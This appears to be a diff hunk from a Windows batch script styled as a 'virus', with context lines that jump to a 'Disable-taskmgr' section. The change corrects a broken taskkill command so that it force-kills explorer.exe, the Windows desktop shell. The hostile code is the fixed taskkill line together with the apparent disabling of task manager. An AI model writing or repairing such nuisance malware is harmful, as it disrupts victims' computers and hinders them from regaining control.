@@ -4,7 +4,7 @@ cls
 color 4
 
 :run
-taskkill /f /im explorer.explorer
+taskkill /f /im explorer.exe
 Test-Virus.txt
 goto Disable-taskmgr
 
